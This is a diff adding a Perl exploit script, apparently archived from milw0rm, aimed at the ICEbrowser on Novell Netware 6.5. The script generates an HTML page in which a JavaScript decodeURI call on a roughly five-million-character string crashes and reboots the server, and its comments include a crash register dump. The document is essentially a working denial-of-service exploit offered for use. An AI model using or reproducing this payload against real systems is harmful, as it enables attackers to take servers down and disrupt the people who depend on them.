@@ -1,0 +1,46 @@
+#!/usr/bin/perl
+# novellnw_ib_sysdos.pl
+# Novell Netware 6.5 (ICEbrowser) Remote System Denial of Service Exploit
+# Jeremy Brown [0xjbrown41@gmail.com/jbrownsec.blogspot.com]
+#
+# "Mozilla/5.0 (NetWare; U; NetWare 6.50.06; en-US) ICEbrowser/6.1.2 NovellViewPort/3.7.2"
+#
+# After target views exploit page, the browser will sorta hang, then a fault occurs and the system reboots.
+# 
+# Abend 1 on P00: Server-5.70.06: Page Fault Processor Exception (Error code 00000000)
+# 
+# Registers:
+#     CS = 0008 DS = 0010 ES = 0010 FS = 0010 GS = 007B SS = 0010
+#     EAX = 00000000 EBX = 9687EF4C ECX = 004EB8F0 EDX = 000000E4
+#     ESI = 00000000 EDI = 00000001 EBP = 8D9E7F3C ESP = 86179EF4
+#     EIP = 00000000 FLAGS = 00010086 
+#     
+#     Access Location: 0x00000000
+# 
+# "Additional Information: The hardware detected a problem while executing an interrupt
+# service routine.  The code being executed is owned by SERVER.NLM.  It may be the source
+# of the problem or there may have been a memory corruption."
+# 
+# Tested on Novell Netware 6.5 SP6 (5.70.06)
+
+$filename = $ARGV[0];
+if(!defined($filename))
+{
+
+     print "Usage: $0 <filename.html>\n";
+
+}
+
+$head = "<html>" . "\n" . "<script type=\"text/javascript\">" . "\n";
+$trig = "decodeURI(\"" . "A" x 5005000 . "\");" . "\n";
+$foot = "</script>" . "\n" . "</html>";
+
+$data = $head . $trig . $foot;
+
+     open(FILE, '>' . $filename);
+     print FILE $data;
+     close(FILE);
+
+exit;
+
+# milw0rm.com [2009-01-16]
